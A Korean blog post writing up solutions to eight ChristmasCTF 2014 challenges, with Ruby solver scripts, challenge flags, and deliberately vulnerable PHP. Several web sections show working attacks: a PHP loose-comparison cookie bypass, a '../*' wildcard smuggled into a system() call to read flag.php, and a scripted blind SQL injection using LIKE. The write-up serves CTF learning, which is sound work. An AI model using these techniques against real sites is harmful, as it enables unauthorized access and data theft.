---
layout: post
title: "ChristmasCTF 2014 Write-up"
date: 2014-12-26 00:41:26 +0900
comments: false
categories:
    - CTF
description: Write-up of ChristmasCTF 2014.
keywords: christmasctf, write-up
redirect_from: /p/20141226/
twitter_card:
    image: http://yous.be/images/2014/12/26/christmasctf-1.png
facebook:
    image: http://yous.be/images/2014/12/26/christmasctf-1.png
---

![ChristmasCTF](/images/2014/12/26/christmasctf-1.png "ChristmasCTF")

<!-- more -->

- [Are you able to multiply? - ALGO200](#are-you-able-to-multiply)
- [JingleBell - MISC200](#jingle-bell)
- [KrystalHolic - WEB400](#krystal-holic)
- [A Letter To Her - WEB100](#a-letter-to-her)
- [A Letter To Her 2 - WEB500](#a-letter-to-her-2)
- [WEIGHT AND MEASURES - ALGO200](#weight-and-measures)
- [PHP Obfuscate - WEB500](#php-obfuscate)
- [Trace - MISC100](#trace)

## <a id="are-you-able-to-multiply"></a>Are you able to multiply? - ALGO200

> 곱하기는 정말 어렵지 않나요?
>
> 서버 : prob2.christmasctf.com 4725

열심히 곱셈을 하는 문제입니다.

``` text
n * n 의 (10 <= n <= 30) 격자와, 자연수 x 가 주어집니다

n * n 격자 안에서 x 개의 인접한 수들의 곱의 최대값을 구하시오(수평, 수직, 대각선, 역대각선 모두 포함)

정답 제출 방식 :

수평으로 곱이 최대값이라면, hori_곱의결과
수직으로의 곱이 최대값이라면, verti_곱의결과
대각선으로의 곱이 최대값이라면 diago_곱의결과
역대각선으로의 곱이 최대값이라면 condiago_곱의결과

정답을 위와 같은 방식으로 제출 해 주십시오

Stage (0 / 20)

03 62 13 99 80 78 15 75 21 07 41 77 47 85 58 57 36 13 79 22 59
72 69 08 52 05 50 54 58 09 02 51 15 57 73 06 63 61 44 20 92 04
46 76 62 81 95 28 22 54 20 06 40 12 12 97 71 50 05 22 64 73 05
91 33 82 19 89 62 31 87 15 76 85 34 07 16 26 57 01 50 73 68 53
17 22 69 10 16 50 08 97 40 53 69 51 87 33 62 36 80 39 01 71 42
06 46 83 13 74 15 07 05 68 51 87 70 35 19 20 86 70 07 72 67 72
91 19 64 41 48 37 88 02 08 27 14 51 08 60 72 09 69 27 32 37 09
28 52 42 44 59 21 69 08 32 42 02 92 79 37 32 37 19 88 69 39 29
84 27 31 26 60 32 83 66 72 21 87 39 50 95 13 19 95 72 98 76 38
18 06 50 28 68 58 48 44 01 47 93 44 53 27 27 98 20 42 04 57 36
99 34 88 92 90 38 77 50 55 13 33 44 49 09 22 88 70 15 23 75 05
19 20 44 79 98 04 65 45 03 30 46 31 74 47 75 70 45 95 26 93 21
91 48 42 20 81 80 74 63 34 32 06 56 41 06 79 52 81 03 26 43 21
69 80 24 04 36 04 14 42 56 31 29 92 12 40 92 88 57 33 16 83 76
33 83 63 42 35 50 42 23 92 95 48 52 81 64 49 79 15 57 26 71 92
78 39 12 72 18 98 59 97 35 95 55 35 37 49 19 93 34 11 04 81 91
22 52 84 70 09 27 83 91 84 13 81 55 82 49 43 89 13 07 37 84 94
52 29 80 39 20 22 13 95 19 71 08 76 68 94 33 53 20 70 42 93 81
79 57 76 12 51 76 62 48 79 90 62 60 46 81 98 89 96 60 28 20 63
28 25 14 24 58 01 46 59 63 87 17 54 83 55 93 94 99 36 52 19 10
79 92 48 29 80 57 53 94 66 99 09 32 37 69 56 19 42 60 76 01 47


x = 6

answer>
```

곱합시다:

``` ruby
require 'socket'

s = TCPSocket.open('prob2.christmasctf.com', 4725)
# Instruction
puts s.recv(65536)

loop do
  # Stage
  str = s.recv(1_000_000)
  puts str
  matrix = []
  x = -1
  str.each_line do |line|
    matrix << line.chomp.split.map(&:to_i) if line =~ /^\d/
    x = $1.to_i if line =~ /x = (\d+)/
  end
  puts "x = #{x}"

  hori = -1
  matrix.each do |row|
    (0..row.size - x).each do |index|
      tmp = row[index...index + x].reduce(:*)
      hori = tmp if hori < tmp
    end
  end

  verti = -1
  matrix[0].size.times do |col_idx|
    (0..matrix.size - x).each do |row_idx|
      tmp = (0...x).reduce(1) { |a, e| a * matrix[row_idx + e][col_idx] }
      verti = tmp if verti < tmp
    end
  end

  diago = -1
  (0..matrix.size - x).each do |row|
    (0..matrix[0].size - x).each do |col|
      tmp = (0...x).reduce(1) { |a, e| a * matrix[row + e][col + e] }
      diago = tmp if diago < tmp
    end
  end

  condiago = -1
  (0..matrix.size - x).each do |row|
    (0..matrix[0].size - x).each do |col|
      tmp = (0...x).reduce(1) { |a, e| a * matrix[row + x - 1 - e][col + e] }
      condiago = tmp if condiago < tmp
    end
  end

  max = [hori, verti, diago, condiago].max
  message = case max
            when hori
              "hori_#{hori}"
            when verti
              "verti_#{verti}"
            when diago
              "diago_#{diago}"
            when condiago
              "condiago_#{condiago}"
            end
  puts message
  s.send(message, 0)
end
```

20 스테이지까지 통과하면 Flag를 받을 수 있습니다:

``` text
크리스마스의 행복도 곱하기가 되길 바라며...


Flag is I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...
```

Flag는 `I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...`입니다.

## <a id="jingle-bell"></a>JingleBell - MISC200

> Kevin은 이번 크리스마스에 자신의 여자친구인 Margaretha에게 노래를 선물하기 위해 징글벨을 편곡했다.  
> 악보에 숨겨진 Kevin의 메세지를 찾으시오.  
> * Authkey has to be Uppercase
>
> ![e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg](/images/2014/12/26/e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg "e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg")

꽤나 수상한 악보입니다. 아랫줄을 보면 박자도 맞지 않고 음도 제멋대로입니다. [CODEGATE 2009 예선전 Prob9](http://webhacking.tistory.com/6) 문제를 참고하여 주시기 바랍니다.

마타하리라는 암호라고 하는데, 정보가 확실하진 않으나 해당 글의 WELCOME TO까지 완벽히 동일합니다. 아래 표를 보고 직접 해독합니다:

![Matahari](/images/2014/12/26/Matahari.jpg "Matahari")

``` text
WELC OME TO CHRI ST
MAS CTF PAS SIS ####
#MAT AHAR IZ ZA NG#
```

Flag는 `MATAHARIZZANG`입니다.

## <a id="krystal-holic"></a>KrystalHolic - WEB400

> http://web-prob.dkserver.wo.tc/krystalholic_1e2fdfa6874f87345dd7f27099a38668

Board를 보면 트위터 아이디 [@kruby808](https://twitter.com/kruby808)이 보입니다. 들어가서 트윗을 보면 좋아하는 뮤직비디오의 주소(<http://www.youtube.com/watch?v=KEDCy1NA8H0>)를 얻을 수 있습니다. 이를 이용해 `kruby808` 계정의 비밀번호를 찾읍시다.

``` text
id : kruby808
pw : th1s_IS_n0T_FL4G
```

로그인을 하면 Flag 메뉴에서 볼 수 있던 level이 10에서 9로 올라갔음을 알 수 있습니다. 더불어 Board 메뉴에서 관리자가 쓴 글을 읽을 수 있습니다.

``` php
if((!preg_match("/[a-f0-9]{32}/",$_COOKIE['session_chk'])) || (strlen($_COOKIE['session_chk']) != 32)) exit('No Cheat!');

if(strtolower("dev_" . $_COOKIE['session_chk']) == strtolower("dev_" . md5($_COOKIE['user_id']))) exit("개발중입니다");

if(strtolower($_COOKIE['session_chk']) == strtolower(md5($_COOKIE['user_id']))) $_SESSION['id'] = $_COOKIE['user_id'];

login 페이지에서 이렇게 자동로그인을 구현했는데 보안에 문제가 없을까요? ㅠㅠ
```

일단 `$_COOKIE['session_chk']`는 32글자의 해시 형태가 되어야 합니다. 두 번째 조건을 보면 `$_COOKIE['session_chk']`가 `$_COOKIE['user_id']`의 MD5면 안 될 것 같은데, 세 번째 조건을 보면 또 `$_COOKIE[session_chk]`와 `$_COOKIE['user_id']`의 MD5를 검사합니다.

하지만 이 관리자는 `==`를 사용했습니다. PHP에서 `==`를 사용할 경우 양쪽 모두 문자열이더라도 한 쪽이라도 숫자처럼 보이면 양쪽 다 숫자 변환을 한 후 비교합니다.

적당히 MD5의 맨 앞 자리가 숫자가 되는 문자열을 찾습니다:

``` ruby
require 'digest/md5'
Digest::MD5.hexdigest('1aacesz')
# => "1a8c7efd14576c4ebd90c2214ecea5cd"
```

그리고 쿠키를 만들어 `user_id`에는 좀전의 `1aacesz`를, 하지만 `session_chk`에는 `00000000000000000000000000000001`을 넣습니다. 이때 두 번째 조건과 세 번째 조건은 아래와 같습니다:

``` php
"dev_00000000000000000000000000000001" == "dev_1a8c7efd14576c4ebd90c2214ecea5cd"
"00000000000000000000000000000001" == "1a8c7efd14576c4ebd90c2214ecea5cd"
```

각각 거짓, 참이어서 `$_SESSION['id']`에 `1aacesz`가 들어가게 됩니다. Flag 메뉴에 들어가면 Flag를 볼 수 있습니다:

``` text
Flag:{UP_down_UP_UP_down}

Your level : Null
```

Flag는 `UP_down_UP_UP_down`입니다.

## <a id="a-letter-to-her"></a>A Letter To Her - WEB100

> [Link](http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/)

Flag 버튼을 누르면 `http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/flag.php`로 이동합니다. 다음과 같은 글이 보입니다:

> 주석에 있지롱 ^_______________________^

이 파일의 주석을 보아야 하는 것 같습니다. 하지만 PHP 파일이라서 보이지 않는 거겠죠. 메뉴의 Clue를 봅시다.

``` php
if(preg_match("/[a-zA-Z]/",$_GET[letter])) exit("No Hack");

elseif(strlen($_GET[letter])>5) exit("No Hack");

system("head ./letter/" . $_GET[letter]);
```

어느 페이지에서 `letter`를 인자로 받고 있는 것 같습니다. Letter 페이지의 Letter 1, Letter 2, Letter 3, Letter 4가 각각 다음과 같은 URL을 갖습니다:

- `http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=1`
- `http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=2`
- `http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=3`
- `http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=4`

`?letter=`에 영문을 입력하지 않고 적당히 우회하면 되는 문제입니다. 정직하게 `../flag.php`를 쓰려니 너무 길고 이미 파일 이름에 알파벳이 포함되어 있습니다.

와일드카드를 써 봅시다. `letter`에 `../*`를 넣습니다.

`http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=../*`

소스를 봅니다:

``` php
==&gt; ./letter/../css &lt;==

==&gt; ./letter/../flag.php &lt;==
<!--?php
/********************************
*                               *
*                               *
*    Flag:{snow_is_commmming}   *
*                               *
*                               *
********************************/
?-->


==&gt; ./letter/../images &lt;==

==&gt; ./letter/../inc &lt;==

==&gt; ./letter/../index.php &lt;==
<!--?php include("inc/5f0c2baaa2c0426eed9a958e3fe0ff94.php"); // header ?-->
<!--?php $page = $_GET['page'];
if($page == "photo"){ ?-->
```

Flag는 `snow_is_commmming`입니다.

## <a id="a-letter-to-her-2"></a>A Letter To Her 2 - WEB500

> [Link](http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/)

Clue를 봅시다:

``` text
CREATE TABLE `table_name` (

`no` int NOT NULL,

`letter` varchar(256) COLLATE 'utf32_unicode_ci' NOT NULL

)
```

Letter는 아까와 같지만 4번 항목만 `Secret :)`이라는 메시지와 함께 가려져 있습니다. 일단 괄호를 쓸 수 없습니다. 시도 끝에 like를 사용한 쿼리를 하나 만들었습니다:

``` text
?letter=-1 or letter like "%%" and no=4
```

여기에서 4번 글의 길이를 알아낼 수 있는데요, like의 와일드카드 `_`를 사용하면 됩니다. 길이가 맞지 않으면 `존재하지 않는 글입니다` 메시지가 나오고, 길이가 맞으면 `Secret :)`을 볼 수 있습니다.

``` text
?letter=-1 or letter like "_" and no=4
?letter=-1 or letter like "__" and no=4
?letter=-1 or letter like "___" and no=4
...
```

길이는 10글자입니다. 문제는 글의 내용인데요, `"%A%"` 등의 알파벳이 존재하지 않습니다. 처음 등장한 Clue에서 `utf32_unicode_ci`라는 부분을 생각하면 글이 한글로 이루어져 있는 것 같습니다. 마찬가지로 like를 이용해 한글 글자를 빼냅니다:

``` ruby
require 'net/http'

('가'..'힣').each do |char|
  puts char if Net::HTTP.get_response(URI.parse("http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/?letter=-1%20or%20letter%20like%20%27#{URI.escape("%#{char}%")}%27%20and%20no=4")).body.force_encoding('utf-8') =~ /Secret/
end
```

끝까지 돌렸다면 아마 아래와 같은 결과가 나왔을 것입니다만, 다 나오기 전에 게싱했습니다.

``` text
그
날
는
라
래
리
아
야
오
플
```

각 글자의 자리는 `__________`의 각 글자 중 한 자리에 넣어봄으로써 알아냈습니다. 글 내용은 `플래그는오리야날아라`였습니다.

Flag는 `오리야날아라`입니다.

## <a id="weight-and-measures"></a>WEIGHT AND MEASURES - ALGO200

> 밤(bam)이라는 검은 거북이가 친구들과 햄버거놀이를 하기 위해 문의를 해왔다. 혹시 놀이를 하다가 다칠 수도 있기 때문이다. 햄버거놀이를 하기 위해 동원된 거북이는 체중과 체력이 모두 다르다. 가능한 한 가장 많은 거북이를 쌓는 방법을 찾아보자.
>
> [+] Notice : 여러 줄이 입력되는데, 한 줄에 한 쌍의 정수가 입력된다. 첫번째 정수는 체중을, 두번째 정수는 거북이의 체력을 나타낸다. 거북이의 체중은 그램 단위로 입력된다. 즉 체중이 600g이고 체력이 1500인 거북이의 등 위에는 900g을 올려놓을 수 있다.
>
> [+] Notice : 어떤 거북이도 자기 체력이 허용하는 한도 내에서만 등 위에 다른 거북이를 올려놓으면서, 몇 마리의 거북이를 쌓을 수 있는지를 나타내는 정수를 출력한다.
>
> 3초 안에 계산해서 제출해야 한다. 제출 방식은 쌓을 수 있는 거북이의 숫자 turtles로 제출하면 된다.
>
> [+] examples
>
> 거북이 = 4마리
>
> No.1
>
> 1300
>
> 1710
>
> No.2
>
> 100
>
> 1350
>
> No.3
>
> 1000
>
> 1550
>
> No.4
>
> 600
>
> 990
>
> Answer = 2 turtles
>
> Server: prob2.christmasctf.com 4941
> (괄호안에 있는 답만 인증해주세요)

다른 알고리즘 문제와 마찬가지로 해답을 코딩하면 됩니다.

``` ruby
require 'socket'

def answer(count, acc, turtles)
  return [count, acc] if turtles.empty?
  return [count + 1, acc + turtles[0][0]] if turtles.size == 1
  turtles.map.with_index do |turtle, i|
    remain = turtles[0...i] + turtles[(i + 1)...turtles.size]
    answer(count + 1, acc + turtle[0], remain.select { |v| v[2] >= acc + turtle[0] })
  end.max_by(&:first)
end

s = TCPSocket.open('prob2.christmasctf.com', 4941)
# Instruction
puts s.recv(65535)

loop do
  print input = s.recv(65535)
  turtle_count = -1
  turtles = []
  lines = input.lines
  lines.shift until lines[0] =~ /round/
  while turtle_count == -1 || turtles.size < turtle_count
    line = lines.shift
    if line.nil?
      print input = s.recv(65535)
      lines = input.lines
      line = lines.shift
    end
    turtle_count = $1.to_i if line.force_encoding('utf-8') =~ /^거북이\s*=\s*(\d+)/
    if line =~ /^No\./
      weight = lines.shift.to_i
      measure = lines.shift.to_i
      turtles << [weight, measure, measure - weight]
    end
  end

  puts message = "#{answer(0, 0, turtles)[0]} turtles"
  s.send(message, 0)
end
```

20문제를 풀게 되면 다음과 같은 메시지를 받을 수 있습니다:

``` text
Congratz! You are Dynamic algorithm master
The Flag is christmas{Rac_reKrei$her_!s_so_cute_@lligat0r!}
```

Flag는 `Rac_reKrei$her_!s_so_cute_@lligat0r!`입니다.

## <a id="php-obfuscate"></a>PHP Obfuscate - WEB500

> PHP Version 5.2.12에서 테스트했습니다
>
> 의도하지 않은 풀이가 존재할 경우에 christmasctf@gmail.com 로 메일을 보내주세요!
>
> 답 처리 해드립니다 :)
>
> <http://goo.gl/ml28eF>

위 링크에 접근이 되지 않는다면 [이 링크](/downloads/2014/12/26/phpobfuscate_6edfd44ed0290d72e6b9a59f256e8dc0.zip)를 사용해주시기 바랍니다.

압축을 풀면 난독화된 `index.php`가 나옵니다:

``` php
<?php

////////////////////////
//          stage1         //
////////////////////////

$á=array(0);
$$a=~$á[0];
$a+=$$a*$$a;
$á[$a]=~$a*-1^$a;
$á[a]=~$á[$a]*-1;
$á[$a]*=$á[a]*$á[$a];
$á[$a]+=$á[$a]^4;
$á[â]=$á[$a]/$á[a];
$à=$_GET[flag];
$á[$a]*=$a+$a;
$á[$a]-=$á[a]^$á[â];
if(ord($à[$a^$a])-$a!=$á[$a])exit("wrong");
$á[$a]-=$á[â]-$á[a];
if((ord($à[$a])-$á[a]!=$á[$a]-$a))exit("wrong");
$á[sqrt($á[a])] = round(sqrt($á[a]*ord($á)))*$á[a];
if($á[$a]-$a != ord($à[$á[a]-$a]))exit("wrong");
$á[round(sqrt($á[a]*ord($á)))*$á[a]] = sqrt($á[a]);
if((ord($à[pow($á[round(sqrt($á[a]*ord($á)))*$á[a]],$á[round(sqrt($á[a]*ord($á)))*$á[a]])])+$a) != $á[$a+$a]*(($á[a]*($a+$a)+$a)/($a+$á[a]+$a))) exit("wrong");
$á[$$a]=ord($à[$$a])-$á[â]+$a;
if(chr($á[$$a]+sqrt($á[$$a])-$a) != $à[$á[$a]-$á[$$a]])exit("wrong");


$flag_array = array(
    7,
    111,
    95,			/*
    114,			*        this is stage2 of challenge.
    117,			*          i think this stage is easy,
    98,			*  but you should read code deliberately
    105,			*     i hope you enjoy ctf and have fun.
    121,			*               from your friend
    97,			*                     rubiya
    95,			*/
    100,
    060
);
for($i=$a;$i<count($flag_array);$i++){ $flag_array[$i] = chr($flag_array[$i]); }
    for($count=5;$count<sqrt($á[$$a]);$count++){
        if($_GET[flag][$count].$_GET[fIag][$count-$i] != $flag_array[$count-$i].$_GET[fIag][$count-$i+1]) exit("wrong");
    }
    $flag_len = strlen($_GET[flag]);
    $length_chk = 1;
    while($flag_len > 1) $length_chk += $flag_len -= 1;
    if(($length_chk < 110) || ($length_chk > 130))exit("wrong");
    $stage3 = substr($_GET[flag],-7);
    $stage3_1 = substr($stage3,0,6);
    $stage3_2 = substr($stage3,1,6);
    $tmp = "stage3_";
    for($i=0;$i<6;$i++){
        $tmp .= ord($stage3_1[$i]) + ord($stage3_2[$i]);
    }
    if($tmp != "stage3_143193195211162158")exit("wrong");
    echo "You did it!<br>Flag is {<strong>" . $_GET[flag] . "</strong>}";

?>
```

동일한 동작을 위해 최대한 비슷한 PHP 버전에서 시도해야 합니다. [Online PHP Functions의 PHP Sandbox](http://sandbox.onlinephpfunctions.com/)에서 PHP 5.2.16 환경으로 작업했습니다.

일단 라틴 알파벳들은 보기 쉬운 알파벳들로 바꾸고, 계산 작업을 수행해 줍니다.

``` php
$_a = array(0);
$_a[a] = 4;
$_a[c] = 17;
$b = $_GET[flag];
if (ord($b[0]) != 116) exit("wrong");
$_a[1] = 102;
if (ord($b[1]) != 105) exit("wrong");
$_a[2] = 64;
if (101 != ord($b[3])) exit("wrong");
$_a[64] = 2;
if (ord($b[4]) != 95) exit("wrong");
$_a[] = 100;
if (chr(109) != $b[2]) exit("wrong");
```

간단히 `$_GET[flag]`의 앞 글자 다섯 자리가 `time_`이라는 것을 알아낼 수 있습니다.

`$flag_array`의 경우 주석 때문에 가운데 영역이 주석 처리됩니다.

``` php
$flag_array = array(
    7,
    111,
    95,
    100,
    060
);
```

첫 번째 `for` 문은 한 줄로 끝나는 것으로, 다음 줄부터는 들여 쓰는 것이 아닙니다. `$i`도 `for` 문이 끝났으므로 `5`로 값이 고정되어 있습니다. 또한 `$_GET[flag]`가 아닌 `$_GET[fIag]`가 있는 것에 주의하시기 바랍니다.

``` php
for ($i = 1; $i < count($flag_array); $i++) { $flag_array[$i] = chr($flag_array[$i]); }
for ($count = 5; $count < 10; $count++) {
    if ($_GET[flag][$count].$_GET[fIag][$count - 5] != $flag_array[$count - 5].$_GET[fIag][$count - 4]) exit("wrong");
}
```

위 코드로부터 아래의 것들을 유추할 수 있습니다.

``` php
$_GET[flag][5] = "7";
$_GET[flag][6] = "o";
$_GET[flag][7] = "_";
$_GET[flag][8] = "d";
$_GET[flag][9] = "0";
```

그 다음은 `$flag_len`입니다:

``` php
$flag_len = strlen($_GET[flag]);
$length_chk = 1;
while ($flag_len > 1) $length_chk += $flag_len -= 1;
if (($length_chk < 110) || ($length_chk > 130)) exit("wrong");
```

`$_GET[flag]`가 16글자가 되어야 한다는 사실을 알 수 있습니다.

``` php
$stage3 = substr($_GET[flag], -7);
$stage3_1 = substr($stage3, 0, 6);
$stage3_2 = substr($stage3, 1, 6);
$tmp = "stage3_";
for ($i = 0; $i < 6;$i++) {
    $tmp .= ord($stage3_1[$i]) + ord($stage3_2[$i]);
}
if ($tmp != "stage3_143193195211162158") exit("wrong");
echo "You did it!<br>Flag is {<strong>" . $_GET[flag] . "</strong>}";
```

`$_GET[flag]`의 뒤에서부터 7글자를 알아낼 수 있는데, 뒤에서 7번째 글자는 이미 `0`으로 정해져 있으므로 거기에서 `chr(143 - ord('0'))`은 `_`, `chr(193 - ord('_'))`은 `b`, ...의 방식으로 끝까지 유추할 수 있습니다.

Flag는 `time_7o_d0_bar0n`입니다.

## <a id="trace"></a>Trace - MISC100

> Just Find a Key
>
> Flag: 0xff  
> 988087853 + k3y + IMG(png)
>
> Hint: Its Decimal. u can change to Dotted Decimal.  
> Hint2: its IP Address in Decimal. therefore => http://988087853/k3y.png and image has been encrypted. try decrypt

988087853은 사실 IP 주소를 의미합니다. <http://988087853>으로 접속하면 우리에게 익숙한 IP로 변환됩니다. <http://58.229.6.45>군요. `/k3y.png` 파일을 [받아 봅시다](/downloads/2014/12/26/k3y.png). 헥스 에디터를 통해 파일을 보게 되면 첫 4바이트가 `0x76 0xAF 0xB1 0xB8`인데, `0xFF`와 XOR 해봅시다.

``` ruby
"\x76\xAF\xB1\xB8".bytes.map { |b| (b ^ 0xFF).chr }
# => ["\x89", "P", "N", "G"]
```

파일 전체가 `0xFF`와 XOR 되어 있는 상태입니다. XOR 하면 제대로 된 이미지를 볼 수 있습니다.

``` ruby
f = File.open('k3y.png', 'rb')
s = f.read
f.close

xor = File.open('k3y_xor.png', 'wb')
xor.write(s.bytes.map { |b| (b ^ 0xFF).chr }.join)
xor.close
```

그렇게 얻은 이미지는 아래와 같습니다:

![k3y_xor.png](/images/2014/12/26/k3y_xor.png "k3y_xor.png")

Flag는 `ASKY_ALWAYS!`입니다.
